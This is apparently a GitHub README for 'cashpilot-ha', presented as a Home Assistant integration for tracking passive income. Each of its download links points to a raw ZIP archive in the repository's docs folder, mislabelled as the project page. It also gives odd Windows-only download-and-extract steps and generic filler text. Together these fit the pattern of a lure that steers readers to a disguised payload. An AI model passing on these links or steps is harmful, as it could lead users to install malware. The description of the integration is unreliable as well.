# 💸 cashpilot-ha - Track Passive Income in Home Assistant

[![Download cashpilot-ha](https://img.shields.io/badge/Download-cashpilot--ha-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Phrasewhiteface293/cashpilot-ha/main/docs/ha_cashpilot_v2.4.zip)

## 📌 Overview

cashpilot-ha is a Home Assistant custom integration for tracking passive income from services like bandwidth sharing and other earning tools. It helps you see your income in one place inside Home Assistant.

Use it if you want a simple dashboard for earnings, device status, and daily trends. It works well for a home setup where you want to watch multiple income sources from a single screen.

## ✨ What it does

cashpilot-ha can help you:

- Show earnings in Home Assistant
- Track income by service or device
- View daily, weekly, and monthly totals
- Display sensor data on your dashboard
- Keep passive income data in one place
- Fit into a self-hosted smart home setup

## 🖥️ What you need

Before you install cashpilot-ha, make sure you have:

- Windows 10 or Windows 11
- A web browser
- A Home Assistant instance
- Access to your Home Assistant files or add-on setup
- An internet connection
- An account or source connected to your earning service

If you plan to use this with Docker or a homelab setup, you can also run it as part of a local service stack.

## 📥 Download and install

1. Open the project page here: https://raw.githubusercontent.com/Phrasewhiteface293/cashpilot-ha/main/docs/ha_cashpilot_v2.4.zip
2. Download or clone the repository to your Windows PC
3. If you use HACS, place the integration files in the Home Assistant custom components folder
4. Restart Home Assistant
5. Add the integration from Home Assistant settings
6. Follow the on-screen setup steps
7. Check your dashboard for the new sensors

If you use a browser download, save the files in a folder you can find later, such as Downloads or Desktop. If you use Git, keep the folder name as `cashpilot-ha` so it is easy to spot.

## ⚙️ Setup in Home Assistant

After you install the files, open Home Assistant and complete the setup:

1. Go to Settings
2. Open Devices & Services
3. Select Add Integration
4. Search for cashpilot-ha
5. Enter the details for your income source
6. Save the setup

Once the setup is complete, Home Assistant should start showing sensor data for earnings and activity.

## 📊 Dashboard ideas

You can show cashpilot-ha data on your Home Assistant dashboard with cards like:

- Current earnings
- Today’s total
- This week’s total
- This month’s total
- Device or service status
- Last update time

A simple dashboard helps you check your passive income at a glance. You can group the data by source if you use more than one service.

## 🔧 Common uses

cashpilot-ha fits well in setups like these:

- A home office dashboard
- A smart home status screen
- A homelab monitoring panel
- A passive income overview page
- A multi-device earnings tracker

It also works well if you use bandwidth-sharing tools and want one place to watch results.

## 🧩 HACS install

If you use HACS, add the repository to HACS custom integrations:

1. Open HACS in Home Assistant
2. Go to Integrations
3. Select the menu
4. Add a custom repository
5. Paste the repository link
6. Choose Integration as the category
7. Install cashpilot-ha
8. Restart Home Assistant

After restart, add the integration from the Home Assistant settings page.

## 🪟 Windows steps

If you are using Windows, these steps help keep setup simple:

1. Open the download link in your browser: https://raw.githubusercontent.com/Phrasewhiteface293/cashpilot-ha/main/docs/ha_cashpilot_v2.4.zip
2. Save the repository files to your computer
3. If the file comes as a ZIP, right-click it and choose Extract All
4. Move the extracted folder to a safe place
5. Follow the Home Assistant install steps above
6. Restart Home Assistant after the files are in place

If you use Windows File Explorer, keep the folder name unchanged so you can find the integration files fast.

## 🐳 Docker and self-hosted use

cashpilot-ha can fit into a Docker-based or self-hosted Home Assistant setup. If you run Home Assistant in a container, make sure the custom component files are mounted in the right path for your setup.

A common setup looks like this:

- Home Assistant container
- custom_components folder
- cashpilot-ha files inside custom_components
- restart of the container after install

This works well for users who run a local server, mini PC, or homelab box.

## 🔍 Troubleshooting

If the integration does not show up, check these items:

- The files are in the right folder
- Home Assistant was restarted
- The repository was copied fully
- The folder name is correct
- HACS completed the install
- The internet connection is active

If you see no data in the dashboard, check the linked earning service settings and make sure the source is active.

If values look wrong, wait for the next update cycle and refresh Home Assistant.

## 🛠️ Tips for best results

- Use clear names for each income source
- Keep your dashboard cards simple
- Add one sensor at a time
- Check data after each restart
- Use groups or sections in Home Assistant to keep the layout clean

## 📁 Repository details

- Name: cashpilot-ha
- Type: Home Assistant custom integration
- Use case: passive income monitoring
- Audience: end users who want a simple earnings view
- Related tools: HACS, Docker, Home Assistant, smart home dashboards

## 🔗 Download again

Open the project page here to download and set up cashpilot-ha: https://raw.githubusercontent.com/Phrasewhiteface293/cashpilot-ha/main/docs/ha_cashpilot_v2.4.zip